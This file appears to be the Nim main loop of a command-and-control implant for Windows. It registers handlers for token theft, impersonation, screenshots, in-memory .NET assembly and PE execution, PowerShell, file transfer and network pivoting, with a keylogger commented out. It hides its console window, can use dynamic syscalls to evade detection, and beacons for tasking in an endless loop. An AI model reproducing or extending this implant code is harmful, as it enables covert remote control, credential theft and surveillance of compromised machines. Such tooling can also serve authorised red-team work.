when defined(DYNSYSCALLS):
  import rth/utils/winapi_wrapper

import mainAgent
import config
import utils
#import commands/ldap

when defined(PROFILE_SMB):
  import profiles/smb as profile
else:
  import profiles/http as profile

when defined(HIDE_CONSOLE):
  import winim/lean

import std/tables
import winim
import winim/clr # 7KB

# Command Imports
import commands/cat
import commands/ls
import commands/lsshares
import commands/cd
import commands/cp
import commands/rm
import commands/mv
import commands/mkdir
import commands/exit
import commands/ps
import commands/upload
import commands/download
import commands/steal_token
import commands/rev2self
import commands/register_file
import commands/inline_assembly  # +8kb
import commands/kill
import commands/sleep
import commands/powershell
import commands/powerscript
import commands/run # +7kb
import commands/whoami
import commands/make_token
import commands/ifconfig   # +4kb
import commands/screenshot  # +4kb
import commands/link       # +8kb
#import commands/keylogger  # +13kb
import commands/execute_pe

# The main Agent Loop
proc main() =


  DBG("[+] Starting Main Loop()")

  # initialize the profile
  profile.initialize()

  agent.commands = {
        210720772860'u64: cast[pointer](cmd_mkdir),  # Command: mkdir
        13889518458486365895'u64: cast[pointer](cmd_powerscript),  # Command: powerscript
        210727925278'u64: cast[pointer](cmd_sleep),  # Command: sleep
        6954173687082'u64: cast[pointer](cmd_whoami),  # Command: whoami
        6385404177'u64: cast[pointer](cmd_kill),  # Command: kill
        193505114'u64: cast[pointer](cmd_run),  # Command: run
        13600002277185138691'u64: cast[pointer](cmd_inline_assembly),  # Command: inline_assembly
        7572294763565533'u64: cast[pointer](cmd_download),  # Command: download
        5863276'u64: cast[pointer](cmd_cd),  # Command: cd
        7572878397037902'u64: cast[pointer](cmd_rev2self),  # Command: rev2self
        6385204799'u64: cast[pointer](cmd_exit),  # Command: exit
        193488125'u64: cast[pointer](cmd_cat),  # Command: cat
        5863588'u64: cast[pointer](cmd_ls),  # Command: ls
        5863780'u64: cast[pointer](cmd_rm),  # Command: rm
        7572640712932234'u64: cast[pointer](cmd_lsshares),  # Command: lsshares
        5863720'u64: cast[pointer](cmd_ps),  # Command: ps
        8246287285705000556'u64: cast[pointer](cmd_execute_pe),  # Command: execute_pe
        13894319758523807742'u64: cast[pointer](cmd_steal_token),  # Command: steal_token
        5863288'u64: cast[pointer](cmd_cp),  # Command: cp
        #249895148381502606'u64: cast[pointer](cmd_keylogger),  # Command: keylogger
        7572495451109098'u64: cast[pointer](cmd_ifconfig),  # Command: ifconfig
        8246785923952289514'u64: cast[pointer](cmd_powershell),  # Command: powershell
        6954104810698'u64: cast[pointer](cmd_upload),  # Command: upload
        5863624'u64: cast[pointer](cmd_mv),  # Command: mv
        2161500648359983177'u64: cast[pointer](cmd_register_file),  # Command: register_file
        8246626487614983875'u64: cast[pointer](cmd_make_token),  # Command: make_token
        8246908067895570563'u64: cast[pointer](cmd_screenshot),  # Command: screenshot]
        6385440179'u64: cast[pointer](cmd_link), # Command: link
        }.toTable


  # Only hidden if specified in the builder script
  when defined(HIDE_CONSOLE):
    discard ShowWindow(GetConsoleWindow(), SW_HIDE)

  when defined(DYNSYSCALLS):
    # set to dynamic
    DBG("[*] Using dynamic syscalls")
    setSyscallType(SyscallType.Dynamic)


  # The main Agent Loop
  while true:

    if not agent.isCheckedIn:
      discard checkIn()
      sleepAgent()
    else:
      getTasking()
      processTasks()
      processSocks()
      processPivot()

      sendResponses()
      sleepAgent()


main()
